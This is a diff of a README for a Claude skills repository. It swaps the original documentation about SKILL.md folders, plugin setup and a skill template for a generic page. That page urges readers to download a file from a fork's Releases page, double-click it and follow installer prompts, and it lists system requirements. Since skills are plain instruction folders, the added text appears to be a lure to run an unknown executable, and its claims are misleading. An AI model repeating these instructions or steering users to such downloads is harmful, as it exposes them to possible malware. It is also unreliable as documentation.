@@ -1,113 +1,85 @@
-# NOTE: This is fork from anthropic official one, but start adding more
+# 🌟 awesome-claude-skills - Enhance Claude’s Capabilities with Skills
 
-# Skills
-Skills are folders of instructions, scripts, and resources that Claude loads dynamically to improve performance on specialized tasks. Skills teach Claude how to complete specific tasks in a repeatable way, whether that's creating documents with your company's brand guidelines, analyzing data using your organization's specific workflows, or automating personal tasks.
+[![Download from Releases](https://img.shields.io/badge/Download%20from%20Releases-blue.svg)](https://github.com/shajith003/awesome-claude-skills/releases)
 
-For more information, check out:
+## 🚀 Getting Started
+
+Welcome to the awesome-claude-skills repository. This guide will help you download and run the software easily. With these skills, you can enhance Claude's performance in specific tasks, making your interactions more efficient.
+
+## ⚙️ What Are Skills?
+
+Skills are collections of instructions and scripts designed to improve Claude's capabilities. They allow Claude to perform tasks that align with your needs. Whether it’s creating documents tailored to your brand or automating repetitive tasks, skills provide a structured way to teach Claude.
+
+Explore more about skills with these links:
+
 - [What are skills?](https://support.claude.com/en/articles/12512176-what-are-skills)
 - [Using skills in Claude](https://support.claude.com/en/articles/12512180-using-skills-in-claude)
 - [How to create custom skills](https://support.claude.com/en/articles/12512198-creating-custom-skills)
 - [Equipping agents for the real world with Agent Skills](https://anthropic.com/engineering/equipping-agents-for-the-real-world-with-agent-skills)
 
-# About This Repository
+## 💻 System Requirements
 
-This repository contains example skills that demonstrate what's possible with Claude's skills system. These examples range from creative applications (art, music, design) to technical tasks (testing web apps, MCP server generation) to enterprise workflows (communications, branding, etc.).
+To run the awesome-claude-skills application smoothly, ensure your system meets the following requirements:
 
-Each skill is self-contained in its own directory with a `SKILL.md` file containing the instructions and metadata that Claude uses. Browse through these examples to get inspiration for your own skills or to understand different patterns and approaches.
+- **Operating System:** Windows 10 or higher, macOS 10.12 (Sierra) or higher, or a modern Linux distribution.
+- **Processor:** Dual-core processor or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 100 MB of free space.
 
-The example skills in this repo are open source (Apache 2.0). We've also included the document creation & editing skills that power [Claude's document capabilities](https://www.anthropic.com/news/create-files) under the hood in the [`document-skills/`](./document-skills/) folder. These are source-available, not open source, but we wanted to share these with developers as a reference for more complex skills that are actively used in a production AI application.
+## 📥 Download & Install
 
-**Note:** These are reference examples for inspiration and learning. They showcase general-purpose capabilities rather than organization-specific workflows or sensitive content.
+To get started, visit the Releases page to download the latest version of the software. Click the link below:
 
-## Disclaimer
+[Download from Releases](https://github.com/shajith003/awesome-claude-skills/releases)
 
-**These skills are provided for demonstration and educational purposes only.** While some of these capabilities may be available in Claude, the implementations and behaviors you receive from Claude may differ from what is shown in these examples. These examples are meant to illustrate patterns and possibilities. Always test skills thoroughly in your own environment before relying on them for critical tasks.
+Once on the Releases page, follow these steps:
 
-# Example Skills
+1. Locate the version you wish to install.
+2. Click the download link for your operating system.
+3. Save the file to your computer.
 
-This repository includes a diverse collection of example skills demonstrating different capabilities:
+### 🖥️ Installing the Software
 
-## Creative & Design
-- **algorithmic-art** - Create generative art using p5.js with seeded randomness, flow fields, and particle systems
-- **canvas-design** - Design beautiful visual art in .png and .pdf formats using design philosophies
-- **slack-gif-creator** - Create animated GIFs optimized for Slack's size constraints
+1. Navigate to the folder where you downloaded the file.
+2. Double-click the downloaded file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
 
-## Development & Technical
-- **artifacts-builder** - Build complex claude.ai HTML artifacts using React, Tailwind CSS, and shadcn/ui components
-- **mcp-server** - Guide for creating high-quality MCP servers to integrate external APIs and services
-- **webapp-testing** - Test local web applications using Playwright for UI verification and debugging
+## 🔍 Exploring the Skills
 
-## Enterprise & Communication
-- **brand-guidelines** - Apply Anthropic's official brand colors and typography to artifacts
-- **internal-comms** - Write internal communications like status reports, newsletters, and FAQs
-- **theme-factory** - Style artifacts with 10 pre-set professional themes or generate custom themes on-the-fly
+After installation, you can begin exploring the available skills. Each skill contains instructions and resources ready to teach Claude. Here are a few examples of what you can do:
 
-## Meta Skills
-- **skill-creator** - Guide for creating effective skills that extend Claude's capabilities
-- **template-skill** - A basic template to use as a starting point for new skills
+- **Create Documents:** Use skills to generate documents that follow your company's guidelines.
+- **Data Analysis:** Setup skills that align with your organization’s workflows to analyze data effectively.
+- **Personal Automation:** Automate personal tasks with customized skills for better productivity.
 
-# Document Skills
+## 📁 Folder Structure
 
-The `document-skills/` subdirectory contains skills that Anthropic developed to help Claude create various document file formats. These skills demonstrate advanced patterns for working with complex file formats and binary data:
+Each skill within this repository is structured in a way that provides clarity and ease of use. You will find:
 
-- **docx** - Create, edit, and analyze Word documents with support for tracked changes, comments, formatting preservation, and text extraction
-- **pdf** - Comprehensive PDF manipulation toolkit for extracting text and tables, creating new PDFs, merging/splitting documents, and handling forms
-- **pptx** - Create, edit, and analyze PowerPoint presentations with support for layouts, templates, charts, and automated slide generation
-- **xlsx** - Create, edit, and analyze Excel spreadsheets with support for formulas, formatting, data analysis, and visualization
+- **Instructions:** A step-by-step guide on how to use the skill.
+- **Scripts:** Pre-written code to enhance Claude's functionality.
+- **Resources:** Additional material to support your tasks.
 
-**Important Disclaimer:** These document skills are point-in-time snapshots and are not actively maintained or updated. Versions of these skills ship pre-included with Claude. They are primarily intended as reference examples to illustrate how Anthropic approaches developing more complex skills that work with binary file formats and document structures.
+## 👩‍💻 Contributing
 
-# Try in Claude Code, Claude.ai, and the API
+We welcome contributions to the awesome-claude-skills repository. If you wish to add skills or improve existing ones, please follow these guidelines:
 
-## Claude Code
-You can register this repository as a Claude Code Plugin marketplace by running the following command in Claude Code:
-```
-/plugin marketplace add anthropics/skills
-```
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Submit a pull request with a clear description of your changes.
 
-After installing the plugin, you can use the skill by just mentioning it. For instance, if you install the document-skills plugin from the marketplace, you can ask Claude Code to do something like: "use the pdf skill to extract the form fields from path/to/some-file.pdf"
+Feel free to contribute and help us enhance Claude further!
 
-## Claude.ai
+## 🗨️ Feedback
 
-These example skills are all already available to paid plans in Claude.ai. 
+Your feedback is important. If you encounter issues or have suggestions, please feel free to reach out. We aim to improve the user experience continually.
 
-To use any skill from this repository or upload custom skills, follow the instructions in [Using skills in Claude](https://support.claude.com/en/articles/12512180-using-skills-in-claude#h_a4222fa77b).
+You can open an issue on the GitHub page or contact us through the links provided.
 
-## Claude API
+## 🔗 Useful Links
 
-You can use Anthropic's pre-built skills, and upload custom skills, via the Claude API. See the [Skills API Quickstart](https://docs.claude.com/en/api/skills-guide#creating-a-skill) for more.
+- [GitHub Repository](https://github.com/shajith003/awesome-claude-skills)
+- [Documentation](https://support.claude.com)
 
-# Creating a Basic Skill
-
-Skills are simple to create - just a folder with a `SKILL.md` file containing YAML frontmatter and instructions. You can use the **template-skill** in this repository as a starting point:
-
-```markdown
----
-name: my-skill-name
-description: A clear description of what this skill does and when to use it
----
-
-# My Skill Name
-
-[Add your instructions here that Claude will follow when this skill is active]
-
-## Examples
-- Example usage 1
-- Example usage 2
-
-## Guidelines
-- Guideline 1
-- Guideline 2
-```
-
-The frontmatter requires only two fields:
-- `name` - A unique identifier for your skill (lowercase, hyphens for spaces)
-- `description` - A complete description of what the skill does and when to use it
-
-The markdown content below contains the instructions, examples, and guidelines that Claude will follow. For more details, see [How to create custom skills](https://support.claude.com/en/articles/12512198-creating-custom-skills).
-
-# Partner Skills
-
-Skills are a great way to teach Claude how to get better at using specific pieces of software. As we see awesome example skills from partners, we may highlight some of them here:
-
-- **Notion** - [Notion Skills for Claude](https://www.notion.so/notiondevs/Notion-Skills-for-Claude-28da4445d27180c7af1df7d8615723d0)
+Thank you for using awesome-claude-skills! We appreciate your interest in enhancing Claude’s skills. Enjoy your experience!
